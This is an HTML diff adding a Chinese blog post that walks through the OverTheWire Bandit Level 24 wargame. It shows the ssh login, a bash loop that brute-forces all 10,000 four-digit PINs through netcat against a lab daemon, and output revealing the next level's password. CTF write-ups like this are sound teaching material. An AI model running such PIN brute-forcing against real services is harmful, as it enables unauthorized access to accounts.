@@ -152,7 +152,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-count">23</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -163,7 +163,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-count">30</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -188,6 +188,149 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://mccranky83.github.io/2023/04/07/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%20%E7%AC%AC%E4%B8%89%E5%91%A8%E7%9A%84%E5%8D%9A%E5%AE%A2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/icons8-dead-cells-1024.png">
+      <meta itemprop="name" content="Mccranky83">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mccranky's Blog">
+      <meta itemprop="description" content=""Bliss it was in that dawn to be alive   But to be young was very heaven."">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Mccranky's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/04/07/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%20%E7%AC%AC%E4%B8%89%E5%91%A8%E7%9A%84%E5%8D%9A%E5%AE%A2/" class="post-title-link" itemprop="url">软件工程 第三周的博客</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2023-04-07 13:54:18" itemprop="dateCreated datePublished" datetime="2023-04-07T13:54:18+08:00">2023-04-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2023-04-23 14:36:44" itemprop="dateModified" datetime="2023-04-23T14:36:44+08:00">2023-04-23</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="简要概述-CTF-OverTheWire-Bandit-Level-24"><a href="#简要概述-CTF-OverTheWire-Bandit-Level-24" class="headerlink" title="简要概述 CTF OverTheWire Bandit Level 24"></a><em>简要概述 CTF OverTheWire Bandit Level 24</em></h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a><em>题目</em></h3><blockquote>
+<p>在端口 30002 上有一个守护进程正在监听，如果提供了 bandit24 的密码和一个秘密的 4 位数的数字密码，它将为您提供 bandit25 的密码。除了通过穷举全部 10000 种组合的方式以外，没有其他获得 pincode 的方法，这被称为暴力破解。</p>
+</blockquote>
+<p>大致思路如下：</p>
+<ul>
+<li>先写一个<code>script</code>，按要求进行排版输出到<code>stdout</code></li>
+<li>把输出的 10000 种组合<code>pipe</code>到<code>netcat</code>监视的<code>localhost:30002</code>进行测试</li>
+<li>直接输出到<code>stdout</code>可能会<code>timeout</code>打断进程，所以我们输出到<code>output.txt</code></li>
+<li>最后<code>cat</code>文本内容拿到密码</li>
+</ul>
+<p>先利用<code>ssh</code>连接到<code>bandit.labs.overthewire.org</code>的服务器，端口号<code>2220</code>，为此我们需要<code>bandit24</code>的密码。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh bandit24@bandit.labs.overthewire.org -p 2220</span><br><span class="line"><span class="comment">#					VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar</span></span><br></pre></td></tr></table></figure>
+
+<p>以<code>bandit24</code>进入 Level 24 之后先到系统文件夹<code>/tmp</code>下建立本关的临时文件夹。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp; <span class="built_in">mktemp</span> -d</span><br><span class="line"></span><br><span class="line"><span class="comment"># /tmp/tmp.u4oQlmpmWL</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /tmp/tmp.u4oQlmpmWL</span><br><span class="line"></span><br><span class="line"><span class="comment"># bandit24@bandit:/tmp/tmp.u4oQlmpmWL$</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>-d</code>代表<code>directory</code>，即告诉<code>mktemp</code>指令创建的临时文件属性为文件夹</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> script.sh</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> 777 script.sh</span><br><span class="line"></span><br><span class="line">vim script.sh</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>touch</code>: 创建文件</p>
+</blockquote>
+<blockquote>
+<p><code>chmod</code> - <code>change mode</code>: 改变文档<code>rwx</code>权限</p>
+</blockquote>
+<ul>
+<li><code>r</code> - <code>read</code>: 读取权限<code>status code</code>为 4</li>
+<li><code>w</code> - <code>write</code>: 书写权限<code>status code</code>为 2</li>
+<li><code>x</code> - <code>execute</code>: 执行权限<code>status code</code>为 1</li>
+</ul>
+<p>进入文本编辑器之后，选定”插入“模式，按<code>i</code>键</p>
+<p>首行书写<code>shebang</code>行，选定使用哪个<code>shell</code>来执行该<code>script</code> - 我们选用<code>bash</code></p>
+<p>然后写我们的<code>entity body</code>的代码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;0000..9999&#125;; <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">        <span class="built_in">printf</span> <span class="string">&quot;%s %s\n&quot;</span> <span class="string">&quot;VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar&quot;</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>除了语法上微小的一点差异，该题的<code>syntax</code>和<code>C</code>的语法很相像，所以不赘述了。</p>
+<p>大致格式就是<code>for [ test statement]; do &lt;command&gt;; done</code></p>
+<p>编辑结束按<code>ESC</code>键回到普通模式，按<code>:</code>,然后输入指令<code>wq</code>，回车保存并退出。</p>
+<p>执行<code>script.sh</code>，并把结果<code>pipe</code>到<code>netcat</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./script.sh | nc localhost 30002 &gt; output.txt</span><br></pre></td></tr></table></figure>
+
+<p>然后<code>cat output.txt</code>读取文本内容，这是其中的一小部分：</p>
+<pre>
+        Fail! You did not supply enough data. Try again.
+        Wrong! Please enter the correct pincode. Try again.
+        Fail! You did not supply enough data. Try again.
+        Wrong! Please enter the correct pincode. Try again.
+        Fail! You did not supply enough data. Try again.
+        Wrong! Please enter the correct pincode. Try again.
+        Fail! You did not supply enough data. Try again.
+        Wrong! Please enter the correct pincode. Try again.
+        Fail! You did not supply enough data. Try again.
+        Wrong! Please enter the correct pincode. Try again.
+        Fail! You did not supply enough data. Try again.
+        Wrong! Please enter the correct pincode. Try again.
+        Fail! You did not supply enough data. Try again.
+        Wrong! Please enter the correct pincode. Try again.
+        Fail! You did not supply enough data. Try again.
+        Wrong! Please enter the correct pincode. Try again.
+        Fail! You did not supply enough data. Try again.
+        Correct!
+        The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+
+        Exiting.
+</pre>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
